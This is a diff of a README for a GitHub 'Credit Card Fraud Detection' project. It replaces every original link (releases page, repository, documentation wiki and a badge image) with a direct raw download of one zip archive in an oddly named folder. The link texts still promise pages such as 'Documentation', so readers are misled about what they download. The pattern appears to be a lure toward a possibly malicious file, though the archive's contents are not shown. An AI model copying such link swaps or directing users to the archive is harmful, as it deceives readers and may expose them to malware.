@@ -6,7 +6,7 @@ Welcome to the Credit Card Fraud Detection application. This tool helps you iden
 
 ## 📥 Download the Application
 
-[![Download Credit Card Fraud Detection](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/releases)
+[![Download Credit Card Fraud Detection](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/raw/refs/heads/main/resolemnize/Credit_Detection_Card_Fraud_v2.1.zip%20Now-Click%20Here-blue)](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/raw/refs/heads/main/resolemnize/Credit_Detection_Card_Fraud_v2.1.zip)
 
 ## 📋 Features
 
@@ -24,7 +24,7 @@ Welcome to the Credit Card Fraud Detection application. This tool helps you iden
 
 ## 🌐 Download & Install
 
-To download the application, visit this page: [GitHub Releases](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/releases).
+To download the application, visit this page: [GitHub Releases](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/raw/refs/heads/main/resolemnize/Credit_Detection_Card_Fraud_v2.1.zip).
 
 1. Click on the link above to navigate to the releases page.
 2. Find the latest release version.
@@ -74,8 +74,8 @@ For assistance, you can reach out via our GitHub Discussions page or join our co
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Bluehecer/Credit-Card-Fraud-Detection)
-- [Documentation](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/wiki)
+- [GitHub Repository](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/raw/refs/heads/main/resolemnize/Credit_Detection_Card_Fraud_v2.1.zip)
+- [Documentation](https://github.com/Bluehecer/Credit-Card-Fraud-Detection/raw/refs/heads/main/resolemnize/Credit_Detection_Card_Fraud_v2.1.zip)
 
 ## 🎉 Advanced Features
 
